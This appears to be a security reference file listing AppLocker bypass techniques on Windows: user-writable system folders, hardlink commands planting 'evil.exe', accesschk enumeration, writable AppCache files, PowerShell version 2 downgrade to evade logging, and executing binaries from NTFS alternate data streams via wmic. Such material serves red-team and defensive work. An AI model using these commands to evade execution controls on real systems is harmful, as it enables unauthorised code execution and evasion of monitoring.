# This File Contains Information on the Most Common AppLocker ByPassing Techniques

## Files Placed Within Writable Paths

The following folders are by default writable by regular/standard users for Windows.

```
C:\Windows\Tasks 

C:\Windows\Temp 

C:\windows\tracing

C:\Windows\Registration\CRMLog

C:\Windows\System32\FxsTmp

C:\Windows\System32\com\dmp

C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys

C:\Windows\System32\spool\PRINTERS

C:\Windows\System32\spool\SERVERS

C:\Windows\System32\spool\drivers\color

C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter

C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)

C:\Windows\SysWOW64\FxsTmp

C:\Windows\SysWOW64\com\dmp

C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter

C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

If a user places a file/folder into one of the above pathes they immediately become the owner of that object. The user can then change the access control lists either via the GUI or using ICALS for said created object. This includes adding the ability to enable execution rights and other related control/options for the object the user created.

If deny execute is inherit a user could either disable inheritance or they can use hardlink to a binary file in another folder. This can be accomplished using the commands below.

```
fsutil hardlink create c:\windows\system32\fxstmp\evil.exe c:\myfolder\plantedfile.exe 

mklink /h c:\windows\system32\fxstmp\evil.exe c:\myfolder\plantedfile.exe 
```

Users can also check the for additional paths by running accesschk from the sysinternals tools and executing the following commands.

```
accesschk -w -s -q -u Users "C:\Program Files" >> programfiles.txt
accesschk -w -s -q -u Everyone "C:\Program Files" >> programfiles.txt
accesschk -w -s -q -u "Authenticated Users" "C:\Program Files" >> programfiles.txt
accesschk -w -s -q -u Interactive "C:\Program Files" >> programfiles.txt

accesschk -w -s -q -u Users "C:\Program Files (x86)" >> programfilesx86.txt
accesschk -w -s -q -u Everyone "C:\Program Files (x86)" >> programfilesx86.txt
accesschk -w -s -q -u "Authenticated Users" "C:\Program Files (x86)" >> programfilesx86.txt
accesschk -w -s -q -u Interactive "C:\Program Files (x86)" >> programfilesx86.txt

accesschk -w -s -q -u Users "C:\Windows" >> windows.txt
accesschk -w -s -q -u Everyone "C:\Windows" >> windows.txt
accesschk -w -s -q -u "Authenticated Users" "C:\Windows" >> windows.txt
accesschk -w -s -q -u Interactive "C:\Windows" >> windows.txt
```

## User Writable Files

There are instances where files are writeable by the user and can be used to bypass AppLocker. The known method of this made possible through the three files found under C:\windows\system32\AppLocker file path. These files include the following.

```
AppCache.dat
AppCache.dat.LOG1
AppCache.dat.LOG2
```

These files are writeable by the first user that logs into the machine after AppLocker has been deployed onto said machine.

## PowerShell Version 2

```
Powershell -version 2
```

Bypasses Constrained language mode in PowerShell, disables logging, and basically circumvents any/all security implementation that PowerShell should/could be configured to have. A sure-fire way to fix this is to turn off the ability for PowerShell version 2 from being used. This can be done via unchecking the option for PowerShell Version 2.0 within the additional Windows Features configuration.

## Visual Studio Tools for Office - .VSTO files

```
evilfile.vsto
```

Users would need to build a solution file using Visual Studio Tools for Office. Confirmation by the user is prompted to them before the solution file can be executed.
     
## NTFS Alternate Data Streams (ADS)

AppLocker rules does not stop things that execute in ADS. More additional information please see the following blog post - https://hitco.at/blog/howto-prevent-bypassing-applocker-using-alternate-data-streams/

What this implicates is that users could then pipe data into an alternate data stream and execute it using various methods. For additional information and a list of said methods please see the following gist - https://gist.github.com/secdevlowe/a98ed65db96145f31d115e23f02d4605

An example of a user creating a binary file via a writable file within the Program Files directory using a ADS can be seen below.

```
type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"

wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'

```
